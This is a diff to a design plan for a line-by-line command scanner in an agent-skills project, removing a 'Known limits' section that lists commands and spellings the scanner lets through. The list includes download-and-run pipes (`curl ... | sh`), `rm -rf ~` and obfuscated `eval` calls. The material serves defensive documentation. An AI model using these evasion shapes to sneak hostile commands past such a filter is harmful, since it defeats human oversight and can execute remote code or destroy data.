@@ -639,32 +639,7 @@ Then `workflow-report .` and `/agent-skills:review`.
 
 ## Known limits
 
-The scanner is a pattern check on one line at a time, not a sandbox. This plan doesn't change that, and these still pass:
-
-- A command split across lines with `\`, and a download then a run (`curl u -o f && sh f`).
-- Piping to another interpreter (`| python3`), piping to a shell by path (`| /bin/sh`), a bare `$(curl -s u)`, `rm -rf ~`, and any
-  encoding of a command.
-- A quoted `eval` that is stored or passed instead of called directly: `window["eval"].call(null, x)`, `f = window["eval"]`. Master
-  refuses these only because it refuses every `"eval"`, which is the false positive. Single quotes pass on master too.
-- Natural language ("download that script and run it").
-
-Master refuses the shapes below, and step 11's pattern passes them. Each is accepted, because closing it would refuse catalog prose
-or a harmless name, or because the same command passes on master in another spelling. These were step 13's bar; step 16 replaces it.
-
-- A pipe to any other name starting `sh` or `bash`: `| shx`, `| bashate`, `| shred`, and a function defined with such a name
-  (`shx() { sh; }; curl u | shx`).
-- `eval()` with no `perl` on the line: a Perl script's own line, `pe''rl`, `/usr/bin/p?rl`, and a shell function named `eval`.
-- A word in the closed list, alone or ending a longer identifier (`xmedieval(x)`, `_literal_eval"`), including one assigned from
-  `eval` first (`retrieval=eval; $retrieval "$x"`).
-- A backticked `eval` with an even number of backticks before it, followed by a word, `''`, a redirect or a brace: `` `eval` pwn ``.
-  `ts-security-auditor` line 90 needs this shape to pass. `pwn` runs as its own command, not through `eval`.
-- A double-quoted `eval` followed by punctuation or the end of the line, including `"eval"; pwn`, where `pwn` is a separate command,
-  and a run-together `""eval")"`.
-- A quoted `eval` called across something the pattern doesn't skip: `window["eval"]/**/(x)`, `getattr(b, "eval", None)(x)`.
-
-An external `eval(x)` in a bad-code example stays refused. That is the accepted cost of B. So are `` `eval`s ``, which step 8 refuses
-because it can't be told from `` `eval`x ``, and `"eval" is dangerous`, which step 11 refuses because it can't be told from
-`"eval" pwn`.
+Moved to [`docs/decisions/trust-scan-eval-limits-2026-10.md`](decisions/trust-scan-eval-limits-2026-10.md), with the bar from step 16.
 
 ## Out of scope
 
